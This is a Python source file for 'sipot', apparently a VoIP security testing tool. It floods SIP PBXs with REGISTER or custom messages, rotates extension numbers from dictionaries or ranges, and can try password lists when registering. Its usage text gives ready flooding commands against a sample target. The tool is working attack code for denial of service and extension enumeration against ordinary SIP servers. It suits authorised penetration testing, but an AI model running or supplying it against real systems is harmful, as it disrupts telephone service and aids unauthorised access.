__GPL__ = """

   Sipvicious extension line scanner scans SIP PaBXs for valid extension lines
   Copyright (C) 2012 Sandro Gauci <sandro@enablesecurity.com>

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.
   
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.
   
   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
__author__ = "Nitsuga"
__version__ = '0.1'
__prog__ = 'sipot'
__desc__ = "SIP Open Tester"

import os, sys, traceback, socket, multitask, random, logging

try:
	from app import voip
	from std import rfc3261, rfc2396, rfc3550, rfc4566, kutil, rfc3489bis
	from external import log
except ImportError: print 'Please install p2p-sip and include p2p-sip/src and p2p-sip/src/external in your PYTHONPATH'; traceback.print_exc(); sys.exit(1)
logger = logging.getLogger('app') # debug(), info(), warning(), error() and critical()

    
# ntsga: parse command line options, and set the high level properties
if __name__ == '__main__': 
	default_ext_ip, default_domain, default_login = kutil.getlocaladdr()[0], socket.gethostname(), os.getlogin()
	from optparse import OptionParser, OptionGroup

	# Usage
	usage = "Usage: %prog [options]"
	usage += "Examples:\r\n"
	usage += "Register extention:\r\n"
	usage += "\tpython %prog --register --username 109 --pwd abc123 --reg-ip 192.168.56.77 \r\n"
	usage += "\r\n"
	usage += "Flooding mode:\r\n"
	usage += "\t *** Flood 500 Msg to 192.168.56.77: ***\r\n"
	usage += "\t python %prog --sipot-mode flooding --to sip:109@192.168.56.77:5060 --flood-number 500 \r\n"
	usage += "\t *** Flood 500 Msg from File to 192.168.56.77: ***\r\n"
	usage += "\t python %prog --sipot-mode flooding --to sip:109@192.168.56.77:5060 --flood-number 500 --flood-msg-file sipot_flood_this.txt \r\n"
	usage += "\t *** Flood 500 Msg to 192.168.56.77 changing extentions with dictionary: ***\r\n"
	usage += "\t python %prog --sipot-mode flooding --to sip:109@192.168.56.77:5060 --flood-number 500 --ext-dictionary sipot_ext_dict_example.txt \r\n"
	usage += "\r\n"
	
	parser = OptionParser(usage,version="%prog v"+str(__version__)+__GPL__)
	
	parser.add_option('-v', '--verbose',   dest='verbose', default=False, action='store_true', help='enable verbose mode for this module')
	parser.add_option('-V', '--verbose-all',   dest='verbose_all', default=False, action='store_true', help='enable verbose mode for all modules')
    
	group1 = OptionGroup(parser, 'Network', 'Use these options for network configuration')
	group1.add_option('',   '--transport', dest='transport', default='udp', help='the transport type is one of "udp", "tcp" or "tls". Default is "udp"')
	group1.add_option('',   '--int-ip',  dest='int_ip',  default='0.0.0.0', help='listening IP address for SIP and RTP. Use this option only if you wish to select one out of multiple IP interfaces. Default "0.0.0.0"')
	group1.add_option('',   '--port',    dest='port',    default=5062, type="int", help='listening port number for SIP UDP/TCP. TLS is one more than this. Default is 5092')
	group1.add_option('',   '--fix-nat', dest='fix_nat', default=False, action='store_true', help='enable fixing NAT IP address in Contact')
	group1.add_option('',   '--max-size',dest='max_size', default=4096, type='int', help='size of received socket data. Default is 4096')
	group1.add_option('',   '--interval',dest='interval', default=180, type='int', help='The interval argument specifies how often should the sock be checked for close, default is 180 s')
	parser.add_option_group(group1)
    
	group2 = OptionGroup(parser, 'SIP', 'Use these options for SIP configuration')
	group2.add_option('','--username',dest='username',default=default_login,help='username to use in my SIP URI and contacts. Default is "%s"'%(default_login,))
	group2.add_option('','--pwd', dest='password', default='', help='set this if REGISTER requires pasword authentication. Default is empty "" to not set.  A list of passwords can be provided in the form of pwd1,pwd1,...,etc.')
	group2.add_option('','--domain',dest='domain',  default=default_domain, help='domain portion of my SIP URI. Default is to use local hostname, which is "%s"'%(default_domain,))
	group2.add_option('','--proxy',dest='proxy',   default='', help='IP address of the SIP proxy to use. Default is empty "" to mean disable outbound proxy')
	group2.add_option('','--to',dest='to', default=None, help='the target SIP address, e.g., \'"Henry Sinnreich" <sip:henry@iptel.org>\'. This is mandatory')
	group2.add_option('','--from',dest='fromAddr', default=None, help='the user SIP address, e.g., \'"Henry Sinnreich" <sip:henry@iptel.org>\'.')
	group2.add_option('','--uri',dest='uri', default=None, help='the target request-URI, e.g., "sip:henry@iptel.org". Default is to derive from the --to option')
	
	group2.add_option('',   '--register',dest='register', default=False, action='store_true', help='enable user register befor sending messages')
	group2.add_option('',   '--reg-username',    dest='reg_username', default=None, help='username used to for register. If not porvided --username will be used.')
	group2.add_option('',   '--reg-ip',  dest='registrar_ip',  default=None, help='Registrar IP. If not provided is extracted from to address: A registrar is a server that accepts REGISTER requests and places the information it receives in those requests into the location service for the domain it handles.')
	group2.add_option('',   '--register-interval', dest='register_interval', default=3600, type='int', help='registration refresh interval in seconds. Default is 3600')
	group2.add_option('','--reg-refresh',dest='reg_refresh', default=False, action='store_true', help='Auto refresh registration. The refresh argument can be supplied to automatically perform registration refresh before the registration expires. Do not perform refresh by default.')
	parser.add_option_group(group2)
    
	group3 = OptionGroup(parser, 'SIPOT', 'Use these options for SIP Open Tester configuration')
	group3.add_option('-M',   '--sipot-mode', dest='sipot_mode', default='default', help='flooding / fuzzing / spoofing. set the mode of attack for SIPOT. Default is flooding.')
	parser.add_option_group(group3)
    
	group4 = OptionGroup(parser, 'Flooding Mode', 'use this options to set flooding parameters')
	group4.add_option('',   '--flood-number', dest='flood_num', default=666, type="int", help='Sets the number of messages to be sent by flooding mode. Default is 500.')
	group4.add_option('',   '--flood-method', dest='flood_method', default='REGISTER', help='Set the method to flood. Default is REGISTER.')
	group4.add_option('',   '--flood-msg-file', dest='flood_msg_file', default=None, help='Provide a message from file to flood.')
	
	group5 = OptionGroup(parser, 'Generate Extention options', 'Extensions options for flooding. Changes the originator extention in each message.')
	group4.add_option('',   '--no-modify-ext',dest='modify_extentions', default=True, action='store_false', help='If not specified, extentions will be modified in each message flooded. To generate extentions options --ext-dictionary &--ext-range  will be used.')
	group5.add_option('',   "--ext-dictionary", dest="ExtDictionary", type="string",help="Specify a dictionary file with possible extension names")
	group5.add_option('',   "--ext-range", dest="ExtRange", default='100-999',metavar="RANGE",help="Specify an extension or extension range\r\nexample: -e 100-999,1000-1500,9999")
	group5.add_option('',   "--ext-range-zeropadding", dest="ExtZeropadding", type="int",help="""the number of zeros used to padd the username.the options "-e 1-9999 -z 4" would give 0001 0002 0003 ... 9999""")
	group5.add_option('',   '--ext-range-template',  dest="ExtTemplate",action="store",help="""A format string which allows us to specify a template for the extensions example svwar.py -e 1-999 --template="123%#04i999" would scan between 1230001999 to 1230999999" """)
	group5.add_option('',   '--ext-range-enabledefaults', dest="ExtDefaults", action="store_true", default=False, help="""Scan for default / typical extensions such as 1000,2000,3000 ... 1100, etc. This option is off by default. Use --enabledefaults to enable this functionality""")
 
	parser.add_option_group(group4)
	(options, args) = parser.parse_args()
    
	handler = log.ColorizingStreamHandler(stream=sys.stdout)
	handler.setLevel(logging.DEBUG)
	handler.setFormatter(logging.Formatter('%(asctime)s.%(msecs)d %(name)s %(levelname)s - %(message)s', datefmt='%H:%M:%S'))
	logging.getLogger().addHandler(handler)
    
	#-------------------- General options---------------------------------
	logger.setLevel((options.verbose or options.verbose_all) and logging.DEBUG or logging.INFO)
	if options.verbose_all:
		if hasattr(rfc3261, 'logger'): rfc3261.logger.setLevel(logging.DEBUG)
		else: rfc3261._debug = True
	# Verify if external file exists
	def FileCheck(fn):
		try:
			open(fn, "r")
			return True
		except IOError:
			print "Error: File does not appear to exist"
			return False
	# Align options: to, URI, domain, registrar_ip, username
	if not options.to and not options.registrar_ip: 
		print 'must supply --to option with the target SIP address'
		sys.exit(-1)
	else:
		if not options.to:
			if not options.uri:
				options.registrar_ip = options.registrar_ip if options.registrar_ip else options.domain
				options.to = rfc2396.Address(str('<sip:'+options.username+'@'+options.registrar_ip+'>'))
				options.uri = options.to.uri.dup()
			else:
				options.uri = rfc2396.URI(options.uri) if options.uri else rfc2396.URI(str('sip:'+options.username+'@'+options.registrar_ip))
				options.to = rfc2396.Address(str(options.uri))
				options.registrar_ip = options.registrar_ip if options.registrar_ip else options.to.uri.host
		else:
			options.to = rfc2396.Address(options.to)
			options.uri = rfc2396.URI(options.uri) if options.uri else options.to.uri.dup()
			options.registrar_ip = options.registrar_ip if options.registrar_ip else options.to.uri.host
	if not options.fromAddr:
		options.username = options.username if options.username else (options.reg_username if options.reg_username else default_login)
		options.reg_username = options.reg_username if options.reg_username else options.username
		options.fromAddr = rfc2396.Address(str('<sip:'+options.username+'@'+options.registrar_ip+'>'))
	else:
		options.fromAddr = rfc2396.Address(options.fromAddr)
		options.username = options.username if options.username else options.fromAddr.displayable
		options.reg_username = options.reg_username if options.reg_username else options.fromAddr.displayable
	# Validate Flooding options
	if options.flood_msg_file and not FileCheck(options.flood_msg_file): sys.exit(-1)
		
	
class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'

class User(object):
	'''The User object provides a layer between the application and the SIP stack.'''
	REGISTERED, FLOODING, UDP, TCP, TLS = 'Registered user','User flooding', 'udp', 'tcp', 'tls' # transport values
	def __init__(self, app):
		self.app = app
		self.state = self.reg_state = None
		self.register = None
		self.reg_result = self.reg_reason = None
		# socket setup
		sock = socket.socket(type=socket.SOCK_DGRAM if app.options.transport == self.UDP else socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind((app.options.int_ip, (app.options.port+1) if app.options.transport == self.TLS else app.options.port))
		self.sock, self.sockaddr, self.nat = sock, kutil.getlocaladdr(sock), app.options.fix_nat
		# socket options
		self.max_size = app.options.max_size
		self.interval = app.options.interval
		# REGISTER options
		self.register_interval = app.options.register_interval
		self.reg_refresh = app.options.reg_refresh
		# SIP options
		self.reg_username = app.options.reg_username
		self.password = app.options.password 
		self.registrarAddr = rfc2396.Address(str('<sip:'+self.reg_username+'@'+app.options.registrar_ip+'>'))
		# Generators
		self._listenerGen = self._registerGen = self._floodGen = None
        #Flooder options
		self.wait_register = app.options.register
		self.flood_num = app.options.flood_num
		self.flood_method = app.options.flood_method
		self.flood_msg = 0
		self.start_flood_time = None
		self.flood_msg_file = app.options.flood_msg_file
		# create a SIP stack instance
		self.transport = rfc3261.TransportInfo(self.sock, secure=(app.options.transport == self.TLS))
		self._stack = rfc3261.Stack(self, self.transport, fix_nat=app.options.fix_nat)
		logger.debug('User created on listening='+str(sock.getsockname())+'advertised='+str(self.sockaddr))
		# create a SIP stack instance
		self.localParty = app.options.fromAddr.dup()
		self.remoteParty = app.options.to.dup()
		self.remoteTarget = app.options.to.dup()
		# create a SIP user agent instance
		self._ua = None
	
	def add_listenerGen(self):
		if not self._listenerGen:
			self._listenerGen  = self._listener()
			multitask.add(self._listenerGen)
		return self
	def add_registerGen(self):
		if not self._registerGen:
			self._registerGen  = self._register()
			multitask.add(self._registerGen)
		return self
	def add_floodGen(self):
		self.state = self.FLOODING
		if not self._floodGen:
			self._floodGen  = self._flood()
			multitask.add(self._floodGen)
		return self


	
	def _flood(self):
		# Flood info messages ---------
		def floodingCtrl():
			if self.state == self.FLOODING:
				import datetime
				def log_perc_completed(i, partials, total=self.flood_num):
					partials = map(int,(partials.split(',')))
					for partial in partials:
						if i == (partial*total/100):
							logger.info(str((datetime.datetime.now()-self.start_flood_time).total_seconds()*1000)+' msec'+':		'+str(int((total*partial/100)//1))+'/'+str(total)+' ('+str(int((partial)//1))+'%) messages sent')
				if not self.start_flood_time:
					self.start_flood_time = datetime.datetime.now()
				self.flood_msg += 1
				log_perc_completed(self.flood_msg,'25,50,75,100')
		# Msg to flood generator ---------
		def _createBaseMessage():
			if self.flood_msg_file:
				with open (self.flood_msg_file, "r") as file_txt:
					file_txt=file_txt.read()
				m = rfc3261.Message()
				try:
					m = m._parse(file_txt)
				except ValueError, E: pass # TODO: send 400 response to non-ACK request
			else:
				m = self._ua.createRequest(self.flood_method)
				m.Contact = rfc3261.Header(str(self._stack.uri), 'Contact')
				m.Contact.value.uri.user = self.localParty.uri.user
				m.Expires = rfc3261.Header(str(self.app.options.register_interval), 'Expires')
			return m
		def _createFloodMsgGen(message_generated):
			if self.app.options.modify_extentions:
				if self.app.options.ExtDictionary is not None:
					try:
						dictionary = open(self.app.options.ExtDictionary,'r')
					except IOError:
						logging.error( "Could not open %s" % self.app.options.ExtDictionary )
						exit(1)
					self.ExtensionsGenerator =  loopExtentionsDictionary(dictionary)
				else:
					self.ExtensionsGenerator = generateExtentions(*(self.app.options.ExtRange,self.app.options.ExtZeropadding,self.app.options.ExtTemplate,self.app.options.ExtDefaults))
				self.message_generated = message_generated
				while True:
					message_generated = self.message_generated
					# Modify message_generated: extension (To,From), tag, Call-ID
					extension = self.ExtensionsGenerator.next()
					message_generated.From.value.uri.user = message_generated.From.value.displayName =  message_generated.To.value.uri.user = message_generated.To.value.displayName = extension
					message_generated.From.tag=str(random.randint(0,2**31))
					message_generated['Call-ID'] = rfc3261.Header(str(random.randint(0,2**31)) + '@' + (message_generated.From.value.uri.host or 'localhost'), 'Call-ID')
					yield (message_generated)
			else:
				while True:
					yield (message_generated)
		# Helpers ---------
		def generateExtentions(rangelist,zeropadding=0,template=None,defaults=False,staticbrute=[]):
			"""generateExtentions gives a yield generator. accepts either zeropadding or template as optional argument"""
			def getRange(rangestr):
				_tmp1 = rangestr.split(',')
				numericrange = list()
				for _tmp2 in _tmp1:
					_tmp3 = _tmp2.split('-',1)
					if len(_tmp3) > 1:        
						if not (_tmp3[0].isdigit() or _tmp3[1].isdigit()):
							raise ValueError, "the ranges need to be digits"                
							return            
						startport,endport = map(int,[_tmp3[0],_tmp3[1]])
						endport += 1
						numericrange.append(xrange(startport,endport))
					else:
						if not _tmp3[0].isdigit():
							raise ValueError, "the ranges need to be digits"                
							return
						singleport = int(_tmp3[0])
						numericrange.append(xrange(singleport,singleport+1))
				return numericrange
			rangelist = getRange(rangelist)
			while 1:
				for statictry in staticbrute:
					yield(statictry)
				if defaults:
					for i in xrange(1000,9999,100):
						yield('%04i' % i)
					
					for i in xrange(1001,9999,100):
						yield('%04i' % i)
						
					for i in xrange(0,9):
						for l in xrange(1,8):
							yield(('%s' % i) * l)
					
					for i in xrange(100,999):
						yield('%s' % i)
				
					for i in xrange(10000,99999,100):
						yield('%04i' % i)
					
					for i in xrange(10001,99999,100):
						yield('%04i' % i)
					
					for i in [1234,2345,3456,4567,5678,6789,7890,0123]:
						yield('%s' % i)
				
					for i in [12345,23456,34567,45678,56789,67890,01234]:
						yield('%s' % i)
				if zeropadding > 0:
					format = '%%0%su' % zeropadding
				elif template is not None:
					format = template
				else:
					format = '%u'
				# format string test
				format % 1 
				for x in rangelist:
					for y in x:
						r = format % y
						yield(r)			
		def loopExtentionsDictionary(dictionaryfile):
			while 1:
				for line in dictionaryfile:
					yield(line.strip())
				dictionaryfile.seek(0)
				r = dictionaryfile.readline()
			dictionaryfile.close()
		# Dest Address
		addr =  self.remoteTarget.uri.hostPort 
		if addr and isinstance(addr, rfc2396.URI):
			if not addr.host: raise ValueError, 'No host in destination uri'
			addr = (addr.host, addr.port or self.transport.type == 'tls' and self.transport.secure and 5061 or 5060)
		# Msg generator
		base_msg = _createBaseMessage()
		flood_msg = _createFloodMsgGen(base_msg)
		print "Flooding %s %s messages to %s" % (self.flood_num, base_msg.method, addr)
		try:
			if self.sock:
				if self.sock.type == socket.SOCK_STREAM:
					try: 
						remote = self.sock.getpeername()
						if remote != addr:
							logger.debug('connected to wrong addr', remote, 'but sending to', addr)
					except socket.error: # not connected, try connecting
						try:
							self.sock.connect(addr)
						except socket.error:
							logger.debug('failed to connect to', addr)
					try:
						for i in range(self.flood_num):
							logger.debug('[Msg:%s/%s] sending[%d] to %s\n%s'%((self.flood_msg+1),self.flood_num,len(data), addr, ''))
							self.sock.send(data)
							floodingCtrl()
						self.app.stop()
						yield
						raise StopIteration()
					except socket.error:
						logger.debug('socket error in send')
				elif self.sock.type == socket.SOCK_DGRAM:
					try:
						for i in range(self.flood_num):
							data = str(flood_msg.next())
							logger.debug('[Msg:%s/%s] sending[%d] to %s\n%s'%((self.flood_msg+1),self.flood_num,len(data), addr, ''))
							logger.debug(data)
							self.sock.sendto(data, addr)
							floodingCtrl()
						self.app.stop()
						yield
						raise StopIteration()
					except socket.error:
						logger.debug('socket error in sendto' )
				else:
					logger.debug('invalid socket type', self.sock.type)
		except AttributeError: pass
		
	def close(self):
		self.register_interval = 0
		multitask.add(self._register())
		if self._ua.gen: self._ua.gen.close(); self._ua.gen = None
	def stop(self):
		if self._listenerGen:
			self._listenerGen.close()
		if self._registerGen:
			self._registerGen.close()
		if self._floodGen:
			self._floodGen.close()
		self._registerGen = None
		return self
	#-------------------- Internal ---------------------------------
	def _createRegister(self):
		'''Create a REGISTER Message and populate the Expires and Contact headers. It assumes
		that self.reg is valid.'''
		m = self._ua.createRegister(self._ua.remoteParty)
		m.Contact = rfc3261.Header(str(self._stack.uri), 'Contact')
		m.Contact.value.uri.user = self.localParty.uri.user
		m.Expires = rfc3261.Header(str(self.app.options.register_interval), 'Expires')
		return m
	#-------------------- Generators ---------------------------------
	def _listener(self):
		'''Listen for transport messages on the signaling socket. The default maximum 
		packet size to receive is 1500 bytes. The interval argument specifies how
		often should the sock be checked for close, default is 180 s.
		This is a generator function and should be invoked as multitask.add(u._listener()).'''
		app.status.append('Listener Generator Initiated')
		try:
			while self.sock and self._stack:
				try:
					data, remote = (yield multitask.recvfrom(self.sock, self.max_size, timeout=self.interval))
					logger.debug('received[%d] from %s\n%s'%(len(data),remote,data))
					self._stack.received(data, remote)
				except multitask.Timeout: pass
		except GeneratorExit: pass
		except: print 'User._listener exception', (sys and sys.exc_info() or None); traceback.print_exc(); raise
		logger.debug('terminating User._listener()')
	def _register(self):
		self.localParty = self.registrarAddr.dup()
		self.remoteParty = self.registrarAddr.dup()
		self.remoteTarget = self.registrarAddr.dup()
		self.reg_result, self.reg_reason = yield self._registerUA()
		if self.reg_result=='success': 
			if self.reg_state == None:
				self.reg_state = self.REGISTERED
				app.status.append(bcolors.OKGREEN+"Register succesful!"+bcolors.ENDC +" (user: "+self.app.options.username+", password: "+self.app.options.password+")")
		else: app.status.append('Register result: '+self.reg_result+'. Reason: '+self.reg_reason)
	def _registerUA(self):
		if self.reg_state == None:
			app.status.append('Register Generator Initiated')
		try:
			if self.reg_refresh and self._ua.gen:
				yield multitask.sleep(self.register_interval - min(self.register_interval*0.05, 5)) # refresh about 5 seconds before expiry
			self._ua.sendRequest(self._createRegister())
			while True:
				response = (yield self._ua.queue.get())
				if response.CSeq.method == 'REGISTER':
					if response.is2xx:   # success
						if self.reg_refresh:
							if response.Expires: self.register_interval = int(response.Expires.value)
							if self.register_interval > 0:								
								self._ua.gen = self._register() # generator for refresh
								multitask.add(self._ua.gen)
						raise StopIteration(('success', None))
					elif response.isfinal: # failed
						raise StopIteration(('failed', str(response.response) + ' ' + response.responsetext))
		except GeneratorExit:
			raise StopIteration(('failed', 'Generator closed'))
	#-------------------------- Interaction with SIP stack ----------------
	# Callbacks invoked by SIP Stack
	def createServer(self, request, uri, stack): 
		'''Create a UAS if the method is acceptable. If yes, it also adds additional attributes
		queue and gen in the UAS.'''
		ua = request.method in ['INVITE', 'BYE', 'ACK', 'SUBSCRIBE', 'MESSAGE', 'NOTIFY'] and rfc3261.UserAgent(self.stack, request) or None
		if ua: ua.queue = ua.gen = None
		logger.debug('createServer', ua)
		return ua
	def createClient(self):
		'''Create a UAC and add additional attributes: queue and gen.'''
		self._ua = rfc3261.UserAgent(self._stack)
		self._ua.autoack = False
		self._ua.scheme = self._stack.transport.secure and 'sips' or 'sip' 
		self._ua.localParty, self._ua.remoteParty, self._ua.remoteTarget = self.localParty.dup(), self.remoteParty.dup(), self.remoteTarget.dup()
        # For multitask
		self._ua.queue = multitask.Queue()
		self._ua.gen = None
		return self
	def sending(self, ua, message, stack): pass
	def receivedRequest(self, ua, request, stack):
		'''Callback when received an incoming request.'''
		def _receivedRequest(self, ua, request): # a generator version
			logger.debug('receivedRequest method=', request.method, 'ua=', ua, ' for ua', (ua.queue is not None and 'with queue' or 'without queue') )
			if hasattr(ua, 'queue') and ua.queue is not None:
				yield ua.queue.put(request)
			elif request.method == 'INVITE':    # a new invitation
				if self._queue is not None:
					if not request['Conf-ID']: # regular call invitation
						yield self._queue.put(('connect', (str(request.From.value), ua)))
					else: # conference invitation
						if request['Invited-By']:
							yield self._queue.put(('confconnect', (str(request.From.value), ua)))
						else:
							yield self._queue.put(('confinvite', (str(request.From.value), ua)))
				else:
					ua.sendResponse(405, 'Method not allowed')
			elif request.method == 'SUBSCRIBE': # a new watch request
				if self._queue:
					yield self._queue.put(('watch', (str(request.From.value), ua)))
				else:
					ua.sendResponse(405, 'Method not allowed')
			elif request.method == 'MESSAGE':   # a paging-mode instant message
				if request.body and self._queue:
					ua.sendResponse(200, 'OK')      # blindly accept the message
					yield self._queue.put(('send', (str(request.From.value), request.body)))
				else:
					ua.sendResponse(405, 'Method not allowed')
			elif request.method == 'CANCEL':   
				# TODO: non-dialog CANCEL comes here. need to fix rfc3261 so that it goes to cancelled() callback.
				if ua.request.method == 'INVITE': # only INVITE is allowed to be cancelled.
					yield self._queue.put(('close', (str(request.From.value), ua)))
			else:
				ua.sendResponse(405, 'Method not allowed')
		multitask.add(_receivedRequest(self, ua, request))
	def receivedResponse(self, ua, response, stack):
		'''Callback when received an incoming response.'''
		def _receivedResponse(self, ua, response): # a generator version
			logger.debug('receivedResponse response='+str(response.response)+' for ua'+str(ua.queue is not None and 'with queue' or 'without queue') )
			if hasattr(ua, 'queue') and ua.queue is not None: # enqueue it to the ua's queue
				yield ua.queue.put(response)
				logger.debug('response put in the ua queue')
			else:
				logger.debug('ignoring response', response.response)
		multitask.add(_receivedResponse(self, ua, response))
	def cancelled(self, ua, request, stack): 
		'''Callback when given original request has been cancelled by remote.'''
		def _cancelled(self, ua, request): # a generator version
			if hasattr(ua, 'queue') and ua.queue is not None:
				yield ua.queue.put(request)
			elif self._queue is not None and ua.request.method == 'INVITE': # only INVITE is allowed to be cancelled.
				yield self._queue.put(('close', (str(request.From.value), ua)))
		multitask.add(_cancelled(self, ua, request))
	def dialogCreated(self, dialog, ua, stack):
		dialog.queue = ua.queue
		dialog.gen   = ua.gen 
		ua.dialog = dialog
		logger.debug('dialogCreated from', ua, 'to', dialog) # else ignore this since I don't manage any dialog related ua in user
	def authenticate(self, ua, obj, stack):
		'''Provide authentication information to the UAC or Dialog.'''
		obj.username, obj.password = self.reg_username, self.password 
		return obj.username and obj.password and True or False
	def createTimer(self, app, stack):
		'''Callback to create a timer object.'''
		return kutil.Timer(app)
	# rfc3261.Transport related methods - FLOODER!
	def send(self, data, addr, stack):
		'''Send data to the remote addr.'''
		def _send(self, data, addr): # generator version
			try:
				logger.debug('sending[%d] to %s\n%s'%(len(data), addr, data))
				if self.sock:
					if self.sock.type == socket.SOCK_STREAM:
						try: 
							remote = self.sock.getpeername()
							if remote != addr:
								logger.debug('connected to wrong addr', remote, 'but sending to', addr)
						except socket.error: # not connected, try connecting
							try:
								self.sock.connect(addr)
							except socket.error:
								logger.debug('failed to connect to', addr)
						try:
							yield self.sock.send(data)
						except socket.error:
							logger.debug('socket error in send')
					elif self.sock.type == socket.SOCK_DGRAM:
						try: 
							yield self.sock.sendto(data, addr)
						except socket.error:
							logger.debug('socket error in sendto' )
					else:
						logger.debug('invalid socket type', self.sock.type)
			except AttributeError: pass
		multitask.add(_send(self, data, addr))

# APP class
class App(object):
	RUNNING = 'Runnning'
	def __init__(self, options):
		logger.info("ntsga: init app")
		self.options = options
		self.status = []
		self.user = None
		multitask.add(self.mainController())
		
	def start(self):
		self.user = User(self).createClient()
		if not self.options.sipot_mode=='flooding': self.user = self.user.add_listenerGen()
		if not self.options.sipot_mode=='flooding' and self.options.register: self.user.add_registerGen()
		# RUN MULTITASK: multitask.run()
		self.RUNNING
		TaskManager = multitask.get_default_task_manager()
		while self.RUNNING and (TaskManager.has_runnable() or TaskManager.has_io_waits() or TaskManager.has_timeouts()):
			TaskManager.run_next()
		return self

	def mainController(self):
		logger.info("ntsga: start flooding controller")
		while True:
			if self.status:
				print self.status.pop(0)
			if self.options.register and not self.user.reg_result==None:
				self.stop()
				raise StopIteration()
			yield

	def stop(self):
		self.RUNNING = False
		return self
		
	def close(self): 
		if self.user:
			self.user.stop()

# Flooding App
class FloodingApp(App):
	def __init__(self, options):
		App.__init__(self,options)
		logger.info("ntsga: init fuzzing app")
		
	def mainController(self):
		logger.info("ntsga: start flooding controller")
		while True:
			self.user.add_floodGen()
			if not self.user.state == self.user.FLOODING:
				self.stop()
				raise StopIteration()
			yield
		# Not needed for FLOODING ...
		if self.status: # Print app status
			print self.status.pop(0)
		# If not register needed or already registered => flood
		if not self.options.register or (self.options.register and self.user.reg_state==self.user.REGISTERED):
			while True:
				self.user.add_floodGen()
				if not self.user.state == self.user.FLOODING:
					self.stop()
					raise StopIteration()
		# If register needed and could not register = > stop app
		elif not (self.user.reg_result=='success' or self.user.reg_result==None):
			print 'Could not register user.'
			self.stop()
			raise StopIteration()
		yield


#-------------------- START APPS---------------------------------
if __name__ == '__main__': 
    try:
        print "------------------------------------------------------------------------------------------------------------"
        if options.sipot_mode == 'flooding': app = FloodingApp(options)
        if not 'app' in globals(): app = App(options)
        app.start()
    except KeyboardInterrupt:
        print '' # to print a new line after ^C
    except: 
        logger.exception('exception')
        sys.exit(-1)
    try:
        app.close()
    except KeyboardInterrupt:
        print "the end."
        
        
        
        


